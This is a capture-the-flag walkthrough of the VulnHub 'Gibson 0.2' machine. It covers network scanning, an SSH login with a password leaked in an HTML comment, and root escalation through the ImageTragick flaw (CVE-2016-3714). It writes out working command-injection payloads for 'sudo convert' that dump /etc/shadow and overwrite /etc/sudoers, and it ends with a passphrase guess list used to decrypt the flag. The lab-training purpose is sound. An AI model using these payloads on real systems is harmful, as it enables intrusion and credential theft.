# Gibson 0.2
[Link to vulnhub](https://www.vulnhub.com/entry/gibson-02,146/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.239.0/24
```
## Enumeration
I found the target at 192.168.239.132. Now I start enumerate services running on that host.
```
root@BOEING:~# nmap -A -T4 -p- 192.168.239.132

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-02-28 07:12 PST
Nmap scan report for 192.168.239.132
Host is up (0.00069s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
MAC Address: 00:0C:29:A0:11:50 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: Host: gibson.example.co.uk; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.239.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
root@BOEING:~# 
```

I've found 2 services running on the target, SSH and HTTP, I'll now check for HTTP service.

When I browse to the web HTTP://192.168.239.132 there is a directory listing found and I request to davinci.html

I review the source code of HTML and found 3 lines of comment.
```html
<!-- Damn it Margo! Stop setting your password to "god" -->
<!-- at least try and use a different one of the 4 most -->
<!-- common ones! (eugene) -->
```

I list some possible users and passwords.
```
davinci
Margo
margo
god
eugene
```

With those list, I've been successful to authenticate to SSH service by using user "margo" and password "god"

And when I have successfully logged on to the target I enumerate the privelege of the user "margo" and found that margo could run command "/usr/bin/convert" as root.
```
root@BOEING:~# ssh margo@192.168.239.132
Ubuntu 14.04.3 LTS
margo@192.168.239.132's password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Feb 28 15:19:39 GMT 2017

  System load:  0.06              Processes:             150
  Usage of /:   82.2% of 1.85GB   Users logged in:       0
  Memory usage: 13%               IP address for eth0:   192.168.239.132
  Swap usage:   0%                IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Feb 28 15:19:39 2017 from 192.168.239.1
margo@gibson:~$ id
uid=1002(margo) gid=1002(margo) groups=1002(margo),27(sudo)
margo@gibson:~$ sudo su
[sudo] password for margo: 
Sorry, user margo is not allowed to execute '/bin/su' as root on gibson.example.co.uk.
margo@gibson:~$ sudo -l
Matching Defaults entries for margo on gibson:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User margo may run the following commands on gibson:
    (ALL) NOPASSWD: /usr/bin/convert
margo@gibson:~$ 
```


This convert is a part of ImageMagick 6.7.7-10. 
```
margo@gibson:~$ convert --help
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
....
....
....
```

With this version it's vulnerable to arbitrary code execution
[CVE-2016-3714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)
for PoC/Exploit
[Ref-1](https://imagetragick.com/)

So let's check it.
```
margo@gibson:~$ sudo convert 'https://example.com"|cat "/etc/shadow' out.png
root:!:16921:0:99999:7:::
daemon:*:16652:0:99999:7:::
bin:*:16652:0:99999:7:::
sys:*:16652:0:99999:7:::
sync:*:16652:0:99999:7:::
games:*:16652:0:99999:7:::
man:*:16652:0:99999:7:::
lp:*:16652:0:99999:7:::
mail:*:16652:0:99999:7:::
news:*:16652:0:99999:7:::
uucp:*:16652:0:99999:7:::
proxy:*:16652:0:99999:7:::
www-data:*:16652:0:99999:7:::
backup:*:16652:0:99999:7:::
list:*:16652:0:99999:7:::
irc:*:16652:0:99999:7:::
gnats:*:16652:0:99999:7:::
nobody:*:16652:0:99999:7:::
libuuid:!:16652:0:99999:7:::
syslog:*:16652:0:99999:7:::
messagebus:*:16921:0:99999:7:::
dnsmasq:*:16921:0:99999:7:::
landscape:*:16921:0:99999:7:::
sshd:*:16921:0:99999:7:::
libvirt-qemu:!:16921:0:99999:7:::
libvirt-dnsmasq:!:16921:0:99999:7:::
duke:$6$xRLSRx7x$O.REaRUKj6zM.ZAYFBfZEfq.iyoiHKlpNCFlh9D8gQBfRdldL05vAxHmjuTgriKCetSADyWyLKvklZhcQp7mu1:16928:0:99999:7:::
colord:*:16922:0:99999:7:::
eugene:$6$UU15rhob$qZ5B2VjeCk9QIlxXS6QDf9MuxFpNkfAQTc3V3ny.57kLHLj1aOdLnmprfL53niAfztzGMLJqSZaS79sYY1X1a/:16928:0:99999:7:::
margo:$6$Nx0eYFUO$f99BzOSc/hBLbflCsV5912gdcNNUKRi/xGTz7xldbr402BQ367eN.GsCScejNNotaJg9oQPhqdzqq/DcHCKYD/:16928:0:99999:7:::
convert.im6: no decode delegate for this image format `/tmp/magick-SaVZTAEJ' @ error/constitute.c/ReadImage/578.
convert.im6: no images defined `out.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$
```

The syntax for execute arbitrary command is:
```
sudo convert 'https://example.com"|<command>"' out.png
```

## Escalation
Now I could escalate the privilege by edit file "/etc/sudoers"
```
sudo convert 'https://example.com"|cp /etc/sudoers /home/margo/"' out.png
sudo convert 'https://example.com"|chown margo:margo /home/margo/sudoers"' out.png
sudo convert 'https://example.com"|chmod +w /home/margo/sudoers"' out.png
vi sudoers
```

Update privilege of margo by add /bin/su to his privilege

```
margo ALL=(ALL) NOPASSWD: /bin/su
```

replace the original file in /etc
```
margo@gibson:~$ sudo convert 'https://example.com"|cp /home/margo/sudoers /etc/sudoers"' out.png
convert.im6: no decode delegate for this image format `/tmp/magick-mJLc4oWT' @ error/constitute.c/ReadImage/578.
convert.im6: no images defined `out.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
root@gibson:/home/margo# id
uid=0(root) gid=0(root) groups=0(root)
root@gibson:/home/margo# 
```

Bingo!!!, got root.

## Finding the flag
Let's check for connection status
```
root@gibson:/home# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1421/dnsmasq    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1107/sshd       
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1441/qemu-system-x8
tcp        0      0 192.168.239.132:22      192.168.239.131:54206   ESTABLISHED 1622/sshd: margo [p
tcp6       0      0 :::22                   :::*                    LISTEN      1107/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1254/apache2    
root@gibson:/home# 
```
Some service is listening on port 5900(qemu-system-x8) that I've not seen in enumeration phase. This is KVM running on the machine.

Now we configure port forwarding through SSH session
```
ssh -D 1111 -N -f -l margo 192.168.239.132
```

setup proxychains by adding the following line in /etc/proxychains.conf
```
socks4  127.0.0.1 1111
```

Execute proxychain
```
proxychains vncviewer 127.0.0.1
```

I found that there are some interesting files in /GARBAGE
I've copied it using FTP server running on my Kali

I check for exif information in jpg file
```
root@BOEING:/kapi/vulnhub/gibson# ./Image-ExifTool-10.44/exiftool ADMINSPO.JPG 
ExifTool Version Number         : 10.44
File Name                       : ADMINSPO.JPG
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2017:02:28 09:36:40-08:00
File Access Date/Time           : 2017:02:28 09:36:40-08:00
File Inode Change Date/Time     : 2017:02:28 09:38:01-08:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 800
Image Height                    : 800
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x800
Megapixels                      : 0.640
```

Try to mount FLAG.IMG
```
root@BOEING:/kapi/vulnhub/gibson# mount FLAG.IMG /mnt/temp
root@BOEING:/kapi/vulnhub/gibson# ls -al /mnt/temp/
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 3 root root  4096 Feb 28 09:46 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
```

Let check for the hint.txt
```
root@BOEING:/mnt/temp# cat hint.txt 
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
```

Let check for other directory and I found
```
root@BOEING:/mnt/temp/.trash# ls -al
total 319
drwxr-xr-x 2 root root   1024 May  5  2016 .
drwxr-xr-x 4 root root   1024 May 14  2016 ..
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
```

With the hint, decrypt the flag
```
Dictionary attack[also test in leet format] of the gpg file:
ZeroCool
zerocool
CrashOverride
crashoverride
Zero Cool
Zero Kool
zeroKool
ZeroKool
crash override
crashoverride


and then found
gpg --passphrase Z3r0K00l flag.txt.gpg
```

```
root@BOEING:/mnt/temp/.trash# cat flag.txt
 _   _            _      _____ _             ____  _                  _   _
| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
|  _  | (_| | (__|   <    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)


Should you not be standing in a 360 degree rotating payphone when reading
this flag...? B-)

Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.

Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.
                                                              --Knightmare
```

### For other information
* [http://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html](http://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html)
* [http://www.naturalborncoder.com/virtualization/2014/10/27/installing-and-running-kvm-on-ubuntu-14-04-part-6/](http://www.naturalborncoder.com/virtualization/2014/10/27/installing-and-running-kvm-on-ubuntu-14-04-part-6/)
